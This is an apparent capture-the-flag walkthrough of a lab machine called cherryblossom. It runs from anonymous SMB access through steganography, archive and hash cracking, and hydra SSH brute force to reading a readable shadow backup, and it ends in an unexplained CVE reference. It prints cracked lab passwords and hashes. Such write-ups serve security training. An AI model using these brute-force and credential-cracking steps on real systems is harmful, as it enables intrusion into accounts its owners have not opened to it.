
```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 62
139/tcp open  netbios-ssn  syn-ack ttl 62
445/tcp open  microsoft-ds syn-ack ttl 62

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
|   account_used: <blank>
|   \\10.64.149.126\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE

```

```
smbclient //10.64.149.126/Anonymous -N -t 900

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb  9 19:22:51 2020
  ..                                  D        0  Sun Feb  9 12:48:18 2020
  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
ge
                10253588 blocks of size 1024. 4671704 blocks available
smb: \> get journal.txt
getting file \journal.txt of size 3470998 as journal.txt (10.3 KiloBytes/sec) (average 10.3 KiloBytes/sec)

```

```
cat journal.txt | base64 -d > output

file output
output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced

```

```
stegpy output         
File _journal.zip succesfully extracted from output

unzip _journal.zip
Archive:  _journal.zip
file #1:  bad zipfile offset (local header sig):  0

file _journal.zip
_journal.zip: JPEG image data


ls
journal.txt  _journal.zip  output

fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal.zip
found id d8ffd8ff, '_journal.zip' is not a zipfile ver 2.xx, skipping
no usable files found

```

it thinks it’s a JPEG…
Open it up in `hexeditor` and we’ll check to see if it’s had its magic number tampered with:

Well, considering that the magic number for a standard `.zip` zipfile is `50 4B 03 04`, I have a feeling we might be right on the money with this one.

 ```
 file _journal.zip                                            
_journal.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Feb 10 2020 00:01:42, uncompressed size 70434, method=deflate
 ```

```
fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
PASSWORD FOUND!!!!: pw == september

```

```
/usr/share/john/7z2john.pl Journal.ctz > hash.txt
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
```

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8

Press 'q' or Ctrl-C to abort, almost any other key for status
tigerlily        (Journal.ctz)     
1g 0:00:01:55 DONE (2025-12-24 12:47) 0.008660g/s 48.49p/s 48.49c/s . 
     
```

```
└─$ 7z e Journal.ctz

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 70434 bytes (69 KiB)

Extracting archive: Journal.ctz
--
Path = Journal.ctz
Type = 7z
Physical Size = 70434
Headers Size = 146
Method = LZMA2:16 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Size:       158136
Compressed: 70434

```

now can open `Journal.ctd` and find more info and can find user and can be found some wordlists that user used to create pwds

so i decode all and make all that wordlists and use into  bruteforce user ssh

```
└─$ hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-24 13:18:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.64.149.126:22/
[22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-24 13:18:50

```

```
[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root shadow 771 Feb  9  2020 /var/backups/gshadow.bak
-r--r--r-- 1 root shadow 1481 Feb  9  2020 /var/backups/shadow.bak
-rw------- 1 root root 936 Feb  9  2020 /var/backups/group.bak
-rw------- 1 root root 2382 Feb  9  2020 /var/backups/passwd.bak

```

```
/var/backups/shadow.bak

```

```
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
sshd:*:18301:0:99999:7:::

```

```
john --wordlist=cherry-blossom.txt hashes.txt

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.$un$hin3      (lily)     
##scuffleboo##   (johan)     
2g 0:00:00:03 DONE (2025-12-24 13:42) 0.5988g/s 2146p/s 2299c/s 2299C/s #shauna#..#imab#3899261#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```
lily@cherryblossom:~$ su johan
Password: 

johan@cherryblossom:~$ ls -la
total 48

-rw-rw-r--  1 johan johan   38 Feb 10  2020 user.txt
-rw-rw-r--  1 johan johan  180 Feb  9  2020 .wget-hsts
johan@cherryblossom:~$ cat user.txt

```

`CVE-2019-18364`


```
root/root.txt
```